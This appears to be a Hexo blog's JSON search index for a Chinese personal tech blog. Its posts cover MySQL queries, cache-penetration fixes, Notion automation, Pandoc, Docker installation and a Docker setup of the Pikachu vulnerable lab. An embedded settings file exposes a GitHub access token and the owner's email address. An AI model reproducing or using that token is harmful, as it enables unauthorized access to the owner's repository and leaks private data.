{"meta":{"title":"daqian","subtitle":"","description":"","author":"郑大钱","url":"https://www.zhengjunyao.top","root":"/"},"pages":[{"title":"bangumis","date":"2021-12-26T14:56:34.000Z","updated":"2022-01-10T17:27:24.064Z","comments":true,"path":"bangumis/index.html","permalink":"https://www.zhengjunyao.top/bangumis/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-12-11T17:20:42.000Z","updated":"2022-01-10T17:28:41.281Z","comments":false,"path":"about/index.html","permalink":"https://www.zhengjunyao.top/about/index.html","excerpt":"","text":""},{"title":"网站统计","date":"2021-12-31T02:27:25.000Z","updated":"2022-01-10T17:28:59.562Z","comments":false,"path":"census/index.html","permalink":"https://www.zhengjunyao.top/census/index.html","excerpt":"","text":""},{"title":"comments","date":"2021-12-21T07:59:36.000Z","updated":"2022-01-10T17:27:07.268Z","comments":true,"path":"comments/index.html","permalink":"https://www.zhengjunyao.top/comments/index.html","excerpt":"","text":""},{"title":"","date":"2021-12-29T05:29:48.906Z","updated":"2021-12-29T05:29:48.906Z","comments":true,"path":"config/posts.json","permalink":"https://www.zhengjunyao.top/config/posts.json","excerpt":"{\"posts\":[{\"content\":\"> 欢迎来到我的小站呀，很高兴遇见你！🤝\\n\\n## 🏠 关于本站\\n\\n## 👨‍💻 博主是谁\\n\\n## ⛹ 兴趣爱好\\n\\n## 📬 联系我呀\\n\",\"data\":{\"title\":\"关于\",\"date\":\"2019-01-25 19:09:48\",\"tags\":null,\"published\":true,\"hideInList\":true,\"feature\":null,\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"\",\"fileName\":\"about\"},{\"content\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \\n\\n","text":"{\"posts\":[{\"content\":\"> 欢迎来到我的小站呀，很高兴遇见你！🤝\\n\\n## 🏠 关于本站\\n\\n## 👨‍💻 博主是谁\\n\\n## ⛹ 兴趣爱好\\n\\n## 📬 联系我呀\\n\",\"data\":{\"title\":\"关于\",\"date\":\"2019-01-25 19:09:48\",\"tags\":null,\"published\":true,\"hideInList\":true,\"feature\":null,\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"\",\"fileName\":\"about\"},{\"content\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \\n\\n\\n\\n[Github](https://github.com/getgridea/gridea) \\n[Gridea 主页](https://gridea.dev/) \\n[示例网站](http://fehey.com/)\\n\\n## 特性👇\\n📝 你可以使用最酷的 **Markdown** 语法，进行快速创作 \\n\\n🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 \\n\\n🏷️ 你可以对文章进行标签分组 \\n\\n📋 你可以自定义菜单，甚至可以创建外部链接菜单 \\n\\n💻 你可以在 **Windows**，**MacOS** 或 **Linux** 设备上使用此客户端 \\n\\n🌎 你可以使用 **𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌** 或 **Coding Pages** 向世界展示，未来将支持更多平台 \\n\\n💬 你可以进行简单的配置，接入 [Gitalk](https://github.com/gitalk/gitalk) 或 [DisqusJS](https://github.com/SukkaW/DisqusJS) 评论系统 \\n\\n🇬🇧 你可以使用**中文简体**或**英语** \\n\\n🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 \\n\\n🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 \\n\\n🌱 当然 **Gridea** 还很年轻，有很多不足，但请相信，它会不停向前 🏃\\n\\n未来，它一定会成为你离不开的伙伴\\n\\n尽情发挥你的才华吧！\\n\\n😘 Enjoy~\\n\",\"data\":{\"title\":\"Hello Gridea\",\"date\":\"2018-12-12 00:00:00\",\"tags\":[\"Gridea\"],\"published\":true,\"hideInList\":false,\"feature\":\"/post-images/hello-gridea.png\",\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \",\"fileName\":\"hello-gridea\"}],\"tags\":[{\"name\":\"Gridea\",\"slug\":\"uRGa_Frk4\",\"used\":true}],\"menus\":[{\"link\":\"/\",\"name\":\"首页\",\"openType\":\"Internal\"},{\"link\":\"/archives\",\"name\":\"归档\",\"openType\":\"Internal\"},{\"link\":\"/tags\",\"name\":\"标签\",\"openType\":\"Internal\"},{\"link\":\"/post/about\",\"name\":\"关于\",\"openType\":\"Internal\"}]}"},{"title":"","date":"2021-12-29T05:29:48.849Z","updated":"2021-12-29T05:29:48.849Z","comments":true,"path":"config/setting.json","permalink":"https://www.zhengjunyao.top/config/setting.json","excerpt":"","text":"{\"config\":{\"branch\":\"master\",\"cname\":\"zhengjunyao.top\",\"domain\":\"https://www.zhengjunyao.top\",\"email\":\"1060477485@qq.com\",\"platform\":\"github\",\"repository\":\"noutinmountain.github.io\",\"token\":\"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\",\"username\":\"noutinmountain\"},\"comment\":{\"commentPlatform\":\"gitalk\",\"disqusSetting\":{\"api\":\"\",\"apikey\":\"\",\"shortname\":\"\"},\"gitalkSetting\":{\"clientId\":\"\",\"clientSecret\":\"\",\"owner\":\"\",\"repository\":\"\"},\"showComment\":false}}"},{"title":"文章统计","date":"2021-12-29T16:54:38.000Z","updated":"2022-01-10T17:28:08.981Z","comments":false,"path":"charts/index.html","permalink":"https://www.zhengjunyao.top/charts/index.html","excerpt":"","text":""},{"title":"","date":"2021-12-29T05:22:48.892Z","updated":"2021-12-29T05:22:48.892Z","comments":true,"path":"config/theme.json","permalink":"https://www.zhengjunyao.top/config/theme.json","excerpt":"","text":"{\"config\":{\"archivesPageSize\":50,\"archivesPath\":\"archives\",\"dateFormat\":\"YYYY-MM-DD\",\"feedCount\":10,\"feedFullText\":true,\"footerInfo\":\"Powered by Gridea\",\"postPageSize\":10,\"postPath\":\"post\",\"postUrlFormat\":\"SLUG\",\"showFeatureImage\":true,\"siteDescription\":\"温故而知新\",\"siteName\":\"Gridea\",\"tagPath\":\"tag\",\"tagUrlFormat\":\"SHORT_ID\",\"themeName\":\"notes\"},\"customConfig\":{}}"},{"title":"莫遥的文档","date":"2021-12-11T16:57:08.000Z","updated":"2022-01-10T17:28:49.696Z","comments":false,"path":"link/index.html","permalink":"https://www.zhengjunyao.top/link/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-01T15:53:52.000Z","updated":"2022-01-01T15:53:52.553Z","comments":true,"path":"friends/index.html","permalink":"https://www.zhengjunyao.top/friends/index.html","excerpt":"","text":""},{"title":"电影","date":"2021-12-16T04:52:02.000Z","updated":"2022-01-10T17:44:52.815Z","comments":true,"path":"movie/index.html","permalink":"https://www.zhengjunyao.top/movie/index.html","excerpt":"","text":""},{"title":"自说自话","date":"2021-12-22T07:16:19.000Z","updated":"2022-01-10T17:29:22.612Z","comments":true,"path":"artitalk/index.html","permalink":"https://www.zhengjunyao.top/artitalk/index.html","excerpt":"","text":""},{"title":"log","date":"2021-12-31T07:19:26.000Z","updated":"2021-12-31T07:19:26.617Z","comments":true,"path":"log/index.html","permalink":"https://www.zhengjunyao.top/log/index.html","excerpt":"","text":""},{"title":"folder","date":"2021-12-28T09:20:11.000Z","updated":"2022-01-10T17:16:26.287Z","comments":true,"path":"folder/index.html","permalink":"https://www.zhengjunyao.top/folder/index.html","excerpt":"","text":""},{"title":"","date":"2021-12-29T05:22:00.247Z","updated":"2021-12-29T05:22:00.247Z","comments":true,"path":"static/404.html","permalink":"https://www.zhengjunyao.top/static/404.html","excerpt":"","text":"Page Not Found * { margin: 0; padding: 0; } body { display: flex; flex-direction: column; height: 100vh; text-align: center; } .box { flex: 1; display: flex; justify-content: center; flex-direction: column; } .number { font-size: 80px; color: #666; font-weight: bold; } .text { font-size: 14px; margin: 24px; color: #333; } .btn-container { display: flex; justify-content: center; } .btn { padding: 8px 24px; display: inline-block; text-decoration: none; background: #fff; border: 2px solid #efefef; color: #333; margin: 24px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; } .footer { padding: 16px; border-top: 1px solid #efefef; color: #777; font-weight: lighter; } .footer a { text-decoration: none; font-weight: bold; color: #000; } 4 0 4 Page not found Back Powered by Gridea var back = document.getElementById('back') back.onclick = function() { console.log('run...'); history.back() }"},{"title":"标签","date":"2021-12-11T16:57:08.000Z","updated":"2022-01-10T17:28:45.996Z","comments":false,"path":"tags/index.html","permalink":"https://www.zhengjunyao.top/tags/index.html","excerpt":"","text":""},{"title":"更新日志","date":"2022-01-01T15:40:13.000Z","updated":"2022-08-04T16:03:09.220Z","comments":true,"path":"update/index.html","permalink":"https://www.zhengjunyao.top/update/index.html","excerpt":"","text":""},{"title":"text","date":"2021-12-11T15:22:39.000Z","updated":"2021-12-11T15:22:39.670Z","comments":true,"path":"text/index.html","permalink":"https://www.zhengjunyao.top/text/index.html","excerpt":"","text":""},{"title":"wallpaper","date":"2021-12-26T16:07:04.000Z","updated":"2022-01-10T17:28:54.435Z","comments":true,"path":"wallpaper/index.html","permalink":"https://www.zhengjunyao.top/wallpaper/index.html","excerpt":"","text":""},{"title":"歌单","date":"2021-12-27T03:24:24.000Z","updated":"2021-12-28T08:37:42.693Z","comments":true,"path":"music/index.html","permalink":"https://www.zhengjunyao.top/music/index.html","excerpt":"","text":"console.error(\"Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.\");"},{"title":"picture","date":"2021-12-26T15:28:42.000Z","updated":"2022-07-31T13:45:40.914Z","comments":true,"path":"picture/index.html","permalink":"https://www.zhengjunyao.top/picture/index.html","excerpt":"","text":"壁纸 收藏的壁纸 生活 分享生活 媒体 媒体图片"},{"title":"video","date":"2021-12-28T07:08:20.000Z","updated":"2021-12-28T08:50:52.555Z","comments":true,"path":"video/index.html","permalink":"https://www.zhengjunyao.top/video/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-12-11T16:56:56.000Z","updated":"2022-01-10T17:29:31.281Z","comments":false,"path":"categories/index.html","permalink":"https://www.zhengjunyao.top/categories/index.html","excerpt":"","text":""},{"title":"media","date":"2021-12-26T16:07:21.000Z","updated":"2022-01-10T17:28:35.407Z","comments":true,"path":"picture/media/index.html","permalink":"https://www.zhengjunyao.top/picture/media/index.html","excerpt":"","text":""},{"title":"life","date":"2021-12-26T16:07:13.000Z","updated":"2022-01-10T17:21:17.105Z","comments":true,"path":"picture/life/index.html","permalink":"https://www.zhengjunyao.top/picture/life/index.html","excerpt":"","text":""}],"posts":[{"title":"使用zapier实现pocket+notion的自动化转存","slug":"使用zapier自动化pocket和notion","date":"2022-07-09T02:43:26.994Z","updated":"2022-07-17T14:45:13.749Z","comments":true,"path":"2022/07/09/使用zapier自动化pocket和notion/","link":"","permalink":"https://www.zhengjunyao.top/2022/07/09/%E4%BD%BF%E7%94%A8zapier%E8%87%AA%E5%8A%A8%E5%8C%96pocket%E5%92%8Cnotion/","excerpt":"","text":"经常需要将手机移动端浏览的信息，需要待看待处理时我希望能转存到notion的database中，方便有空的时候再来梳理，有了这个需求就寻找这种解决方案，至此找到了zapier，不仅能实现notion和pocket之间的自动化转存，还能实现很多app的自动化联动 zapier设置zapier上有pocket+notion的模版，点击链接按着指引设置即可， 指引地址 连接完pocket和notion账户后选择你想同步的数据库 选择你要同步到notion的元素即列名 设置完，点击打开，zapier会发送一条自动同步到notion作为测试 打开notion你设置同步更新的数据库检查是否已同步 发现同步成功，自此自动化转存搭建完成 实操联动当我在通勤或外出时，浏览到一篇很不错的文章，点击分享 直接save to pocket转存到pocket中，借助zapier会检测到我的pocket的item更新了自动转存到我的notion 的database中，从而让我的所有都是围绕notion作为中枢进行的 以上是针对移动端转存的方案，电脑端的直接浏览器插件一键转存即可","categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"}]},{"title":"mysql的增删改查","slug":"mysql表的增删改查","date":"2022-06-24T08:47:52.291Z","updated":"2022-07-17T14:45:40.760Z","comments":true,"path":"2022/06/24/mysql表的增删改查/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/24/mysql%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/","excerpt":"","text":"[TOC] 新增1insert into B select * from A；//将A表的信息通过查询新增到B表中去 聚合查询1count；//返回到查询的数据总和 1sum；//返回到查询的数据总和（只对数字有意义） 只对数字有意义 1avg/max/min;//返回查询数据的平均值/最大值/最小值(只对数字有意义） 分组查询1select * from 表名 group by 分组条件； 这里是先执行分组，再根据分组执行每个组的聚合函数。 条件查询1having； group by 子句进行分组以后，需要对分组结果再进行条件过滤时，就可以使用 having。where 是在分组之前执行，如果要对分组之后的结果进行条件筛选，就需要使用 having(having 搭配 group by 使用）。 例如：求每种角色的平均薪资，除了吴九。（这里就是用 where，分组之前指定条件，先去除吴九，在分组求平均薪资。 求每种角色平均薪资，只保留平均薪资 10000 以下的，这里就用 having。要先求出平均薪资才能进行筛选。 联合查询12第一种写法：select * from 表名1，表名2；第二种写法：select * from 表名1 join 表名2 on 条件； 联合查询（较重要）是多表查询，前面的查询都是单表查询。多表查询中的核心操作 — 笛卡尔积。 笛卡尔积的运算就是将两个表的每条记录分别进行组合，得到一组新的记录。 以上记录并不都是我们想要的结果，我们可以通过筛选得到我们想要的结果。 那么 join on 后面跟条件和 用 where 跟条件有什么区别呢？ from 多个表 where 写法叫做 “内连接 “。使用 join on 的写法, 既可以表示内连接, 还可以表示外连接。select 列名 from 表 1 inner join 表 2 on 条件; inner join 表示是 “内连接” 其中 inner 可以省略。select 列名 from 表 1 left join 表 2 on 条件; 左外连接。select 列 from 表 1 right join 表 2 on 条件; 右外连接。 自连接自连接是指在同一张表连接自身进行查询。 例如：显示所有 “ 语文 ” 成绩比 “数学” 成绩高的成绩信息。 首先要知道语文和数学这两门课程的 course_id，先找到这俩门课程。然后在比较他俩高低。 1select s1.student_id,s1.score,s2.score from score as s1,score as s2 where s1.student_id=s2.student_id and s1.course_id=3 and s2.course_id=1 and s1.score&gt;s2.score; 合并查询12union；//这个可自动去重union all；//这个不可自动去重 该操作符用于取得两个结果集的并集。 例如：查询 id 小于 3，或者名字为 “英文” 的课程。 1select * from course where id&lt;3 union select * from course where name=&#x27;英文&#x27;; 或者使用 or 来实现 1select * from course where id&lt;3 or name=&#x27;英文&#x27;；","categories":[{"name":"数据库","slug":"数据库","permalink":"https://www.zhengjunyao.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://www.zhengjunyao.top/tags/mysql/"}]},{"title":"YouTube和twitter的热点榜单","slug":"YouTube和twitter的热点榜单","date":"2022-06-24T07:09:41.877Z","updated":"2022-07-17T14:45:01.940Z","comments":true,"path":"2022/06/24/YouTube和twitter的热点榜单/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/24/YouTube%E5%92%8Ctwitter%E7%9A%84%E7%83%AD%E7%82%B9%E6%A6%9C%E5%8D%95/","excerpt":"","text":"经常需要上YouTube和推特学习和看看大佬的观点和正在做的事，竟然国内视频平台都有对各种榜单数据有进行一些聚合，我就在想YouTube和Twitter应该有这类的热点榜单，能省去我自己去筛选，直接看top10反而更高效些，所以就整理了这篇 推荐工具 1：Youtube 工作室 网址：https://studio.youtube.com YouTube 工作室即 Youtube Studio，这是每个频道的后台，可以设置频道的各种功能，同时可查看频道的详细数据，是 YouTube 运营者最常用到的工具。 YouTube 工作室后台数据非常详细，有了这些数据，就能有针对性地优化视频，从而获取更多流量推荐。 但注意，如果你只是用它来看数据上下波动是没什么意义的，只有从数据的表象找出规律，并用于调整你接下来的创作和发布策略，才是正确的用法。 推荐工具 2：YouTube 搜索功能油管搜索功能很强大，但一般人主要用于搜索视频资料，其实它也可以作为运营辅助工具，不论是找创作灵感，还是寻找关键字，对运营油管频道都很帮助。 a. 搜索关键词：搜索框自动弹出联想关键词和长尾词，这些关键词一般是有较高权重的，可以用于频道或视频关键词。 b. 搜索视频：在搜索结果里找到历史数据较好或者近期数据较好的相关视频，全面分析这些视频的缩略图、标题、描述、标签数据趋势等，再参考创作和运营。 推荐工具 3：Google Trends 网址：http://trends.google.com 谷歌趋势是谷歌旗下的一款搜索工具，它基于谷歌搜索，可以查看某个关键词在一定时间范围内的受欢迎程度和搜索趋势。 Google Trends 对于 YouTube 运营来说，一般用于了解某个领域 / 主题的搜索热度以及发展趋势，帮助 YouTube 创作者或运营者更好地选题创作以及运营频道。 推荐工具 4：socialblade 网址：http://socialblade.com Socialblade 是一个数据抓取和分析的网站，内容不仅包括 YouTube，还有 FB、TikTok Twitter、Instagram 等等。 在这个网站上，查看油管各个分类的频道排名，还可以按照国家和地区来查看频道排名。还可以查看某个频道的详细数据，包括订阅、播放、收益等。 推荐工具 5：TubeBuddy 网址：http://tubebuddy.com TubeBuddy 是一个免费的浏览器扩展程序，可以在 Chrome 或火狐浏览器中安装。主要用来查询分析热门关键词，帮助你选择判断 Tags 标签，可以让更多用户精准地找到你所上传的视频。 不仅能查看自己的视频 tags 标签，还能看别人视频的 tag 标签，当看到和你的视频相关的，可以添加到你自己的视频中。 推荐工具 6：vidIQ 网址：http://vidiq.com vidIQ 和 tubebuddy 大同小异，主要用于添加标签和分析视频关键词。vidiq 显示的数据很多，但对多数人而言，只重点关注几个核心数据即可。 vidiq 有免费版和收费版，免费版只能使用基础的功能，收费版也分几个版本，一般都是绑定账号的，越高级的版本功能越多。 推荐工具 7：Grammarly 网址：http://Grammry.com Grammarly 最早出自乌克兰基辅一家公司，可以自动检测英文是否存在语法、拼写和标点等错误，并为用户提供纠正功能。 注册流程很简单，直接关联 Google 账户就行，而且不必下载，可以在浏览器安装插件就可以用。对于英语水平比较一般或者比较差的运营者，强烈推荐使用。","categories":[{"name":"自媒体","slug":"自媒体","permalink":"https://www.zhengjunyao.top/categories/%E8%87%AA%E5%AA%92%E4%BD%93/"}],"tags":[{"name":"YouTube","slug":"YouTube","permalink":"https://www.zhengjunyao.top/tags/YouTube/"}]},{"title":"缓存穿透、缓存击穿、缓存雪崩区别和解决方案","slug":"缓存穿透、缓存击穿、缓存雪崩区别和解决方案","date":"2022-06-21T07:23:27.083Z","updated":"2022-07-17T14:25:06.033Z","comments":true,"path":"2022/06/21/缓存穿透、缓存击穿、缓存雪崩区别和解决方案/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F%E3%80%81%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF%E3%80%81%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E5%8C%BA%E5%88%AB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","excerpt":"","text":"缓存处理流程前台请求，后台先从缓存中取数据，取到直接返回结果，取不到时从数据库中取，数据库取到更新缓存，并返回结果，数据库也没取到，那直接返回空结果 缓存穿透 描述：缓存穿透是指缓存和数据库中都没有的数据，而用户不断发起请求，如发起为id为“-1”的数据或id为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大。 解决方案： 接口层增加校验，如用户鉴权校验，id做基础校验，id&lt;=0的直接拦截； 从缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，缓存有效时间可以设置短点，如30秒（设置太长会导致正常情况也没法使用）。这样可以防止攻击用户反复用同一个id暴力攻击 缓存击穿 描述： 缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大，造成过大压力 解决方案： 设置热点数据永远不过期 加互斥锁，互斥锁参考代码如下： 说明： 缓存中有数据，直接走上述代码13行后就返回结果了 缓存中没有数据，第1个进入的线程，获取锁并从数据库去取数据，没释放锁之前，其他并行进入的线程会等待100ms，再重新去缓存取数据。这样就防止都去数据库重复取数据，重复往缓存中更新数据情况出现 当然这是简化处理，理论上如果能根据key值加锁就更好了，就是线程A从数据库取key1的数据并不妨碍线程B取key2的数据，上面代码明显做不到这点 缓存雪崩 描述： 缓存雪崩是指缓存中数据大批量到过期时间，而查询数据量巨大，引起数据库压力过大甚至down机。和缓存击穿不同的是，缓存击穿指并发查同一条数据，缓存雪崩是不同数据都过期了，很多数据都查不到从而查数据库。 解决方案： 缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生 如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中 设置热点数据永远不过期","categories":[{"name":"后端","slug":"后端","permalink":"https://www.zhengjunyao.top/categories/%E5%90%8E%E7%AB%AF/"}],"tags":[{"name":"java","slug":"java","permalink":"https://www.zhengjunyao.top/tags/java/"}]},{"title":"使用typora转换word等富文本格式","slug":"使用typora转换word等富文本文档","date":"2022-06-21T06:45:20.112Z","updated":"2022-07-17T14:45:48.478Z","comments":true,"path":"2022/06/21/使用typora转换word等富文本文档/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/%E4%BD%BF%E7%94%A8typora%E8%BD%AC%E6%8D%A2word%E7%AD%89%E5%AF%8C%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/","excerpt":"","text":"使用typora写的markdown文档有时需要导出为word文档这些富文本格式（真的讨厌富文本），其实typora是支持，不过需要下载第三方的转换工具pandoc，所以就需要安装配置 Pandoc安装一个强大的命令行工具 **Pandoc**，用于将文件从一种标记语言转换为另一种标记语言。常用的标记语言包括 Markdown、ReStructuredText、HTML、LaTex、ePub 和 Microsoft Word DOCX Mac上直接使用 brew 安装 1brew install pandoc 在typora配置转换下载完成后typora会自动寻找路径匹配 接下来就可以把md文件转换导出更多富文本格式了，除此之处，还可以通过命令行方式来实现 Markdown 转 Html 1pandoc index.md -o index.html -c Github.css Markdown 转 Word 1pandoc index.md -o index.docx -c Github.css 导出富文本通过pandoc导出的word文档兼容性适配性上我还是非常满意的 markdown原文件 导出word格式 可以看出来适配还是可以的 感谢你的阅读，有问题可以email联系我","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"typora","slug":"typora","permalink":"https://www.zhengjunyao.top/tags/typora/"}]},{"title":"typora+upic+阿里云oss写作流","slug":"typora+upic+阿里云oss写作流","date":"2022-06-21T02:17:35.566Z","updated":"2022-07-17T14:45:24.409Z","comments":true,"path":"2022/06/21/typora+upic+阿里云oss写作流/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/typora+upic+%E9%98%BF%E9%87%8C%E4%BA%91oss%E5%86%99%E4%BD%9C%E6%B5%81/","excerpt":"","text":"搭建个人博客后写文章不可避免的要选择写作工具和图床 选择typora目前主力是使用typora写作，这款工具简洁易用，所见即所得，没有那么多花里胡哨，不愧是国产之光 图床选择自己搭建的阿里云oss图床图床选择的话之前一直白嫖jsd，自从jsd被限制后就转用了知乎的，后面知乎图床也不对外开放，兜兜转转一堆麻烦，图片迁移来迁移去很麻烦，果然免费才是最贵的，自己用阿里云oss搭建了个图床，流量费也还可以，毕竟图片是存在自己这里的，而且速度和稳定都可以，当然也搭过github图床，因为在国内不是很稳定，我就老是上传不了，梯子需要一直切换节点改host等很麻烦，作罢 图床上传工具upic搭建后图床后需要一款工具连接图床，阿里云官方的不好用，我是mac端所以在GitHub上找了个开源工具upic，应用商店现在有上架，配置起来很简单，支持截图剪切板上传 typora支持upic的上传服务 写作流用typora写作，然后图片直接截图，粘贴，typora会自动将截图上传至我的图床，然后继续写作，相比之前上传然后粘贴图片url简单多了，而且避免了思路在来回切换时的打断，写完后直接保存更新至我的博客中，当然一篇博客可以一键多平台同步，还有typora写作的md文档可以选择工具转换适配微信公众号，这些技巧下面会继续说 感谢您的阅读，有什么问题可以email找我","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工作流","slug":"工作流","permalink":"https://www.zhengjunyao.top/tags/%E5%B7%A5%E4%BD%9C%E6%B5%81/"}]},{"title":"使用i微信阅读笔记一键同步到notion","slug":"将微信读书的笔记一键同步到_notion_","date":"2022-06-21T01:44:56.632Z","updated":"2022-07-17T14:44:28.280Z","comments":true,"path":"2022/06/21/将微信读书的笔记一键同步到_notion_/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/%E5%B0%86%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6%E7%9A%84%E7%AC%94%E8%AE%B0%E4%B8%80%E9%94%AE%E5%90%8C%E6%AD%A5%E5%88%B0_notion_/","excerpt":"","text":"i 微信读书插件，之前已经支持了将笔记同步到 flomo 和 readwise，notion 由于 notion 的接口稍微比其他第三方复杂一点，一共需要两个步骤，所以单独写一篇使用文档。 notion 效果我们先来看下同步成功的效果。 • 插件会在一个目录 (page) 下，自动创建一个叫 “i 微信读书” 的表格（database）。 会记录每本书的标题、链接、作者、简介、评分、字数等基本信息。 • 我们可以使用 notion 的视图功能，来展示不同的样式。 • 点击每条记录，会进入到笔记详情当中，包含每本书所有的划线和评论。 i 微信读书插件配置i 微信读书插件需要配置两个参数，分别对应 notion 的两个步骤。 一个是 token，一个是 page_id。 token首先我们要理解，插件相当于创建了一个机器人，帮你把微信读书笔记，写到了你的 notion 笔记本当中。 而恰好 notion 支持创建机器人，这里的 token 就是机器人的授权码，谁拿到这个授权码，谁就可以对机器人发号施令。（当然，机器人的权限是受限制的，并且主人可以随时关闭和删除机器人，所以不用担心安全问题） 那怎么创建 notion 机器人呢？其实 notion 有文档，为了操作简单，我可以直接告诉你。 登陆 notion。2. 访问 https://www.notion.so/my-integrations。3. 填写必要的信息，点击创建。 就这么简单，可以看到，这里我创建了一个叫 ireader 的机器人，上面的 Secrets 就是我说的 token，复制它填写到插件的第一个输入框即可。 page_idpage_id 主要是 notion 用来权限控制的，你可以理解为，你虽然创建了一个 notion 机器人，但他可以访问你的哪个目录，哪个文件，其实需要你给他开一下权限。就像给你的朋友分享文档权限一样。 所有这里，我们要找一个页面，给机器人开启编辑权限即可。 例如，我在 “笔记” 页面下，点击“share”，邀请了机器人 ireader 。 注意，这里父级要的是一个 page , 不是 database。 机器人对这个页面有了编辑权限，地址栏中的后面那串字符串就是 page_id ，我们拷贝复制到第二个输入框即可。 注意，如果你的目录名称是英文，URL 上除去英文名称的部分才是 pageid 验证我们在插件中填入 token 和 page_id 后，点击同步，可以看到同步成功，则说明配置成功，后续将不用重新配置，每本书轻轻一点即可。 安装可以在 Chrome 应用商店搜索 “i 微信读书” 安装插件 无法访问 google 的朋友，可以访问官网进行手动下载安装。 https://secreter.github.io/ireader/index.html","categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"}]},{"title":"渗透测试靶场pikachu搭建（docker）","slug":"Docker安装部署渗透测试平台pikachu","date":"2022-06-15T09:04:27.490Z","updated":"2022-07-17T14:57:45.671Z","comments":true,"path":"2022/06/15/Docker安装部署渗透测试平台pikachu/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/Docker%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0pikachu/","excerpt":"","text":"“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它” Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意 下载pikachu到本地下载点击这里 Docker上部署前的准备首先得提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境 在docker直接输入以下命令： docker pull mysql docker pull php 部署pikachu 切换到pikachu本地路径 输入以下命令（注意最后有个点，默认使用 “上下文目录（Context）下的名为Dockerfile 的文件作为 Dockerfile”） docker build -t &quot;pikachu&quot; . 部署运行成功 4.进入docker直接跳转即可 本地部署成功 部署成功直接开干，渗透测试的靶场拿来练习","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Docker(mac)的安装","slug":"安装_Docker（macOS）","date":"2022-06-15T03:42:28.189Z","updated":"2022-07-17T14:45:34.714Z","comments":true,"path":"2022/06/15/安装_Docker（macOS）/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/%E5%AE%89%E8%A3%85_Docker%EF%BC%88macOS%EF%BC%89/","excerpt":"","text":"本文简单介绍介绍如何在 macOS 系统下安装 Docker 前提条件安装 Docker 时，macOS 系统最低要求为 Mojave 10.14。详情请访问 Docker Desktop for Mac。 安装 Docker方式一：使用 Homebrew 安装Homebrew 的 Cask 已经支持 Docker Desktop for Mac。因此，您可以很方便的使用 Homebrew Cask 来安装 Docker： 1$ brew install --cask docker 方式二：手动下载安装如果您需要手动下载，请下载 Docker 官网的 Docker.dmg 文件，文件大约 500 MB。 如同 macOS 其它软件一样，安装也非常简单，双击下载的 .dmg 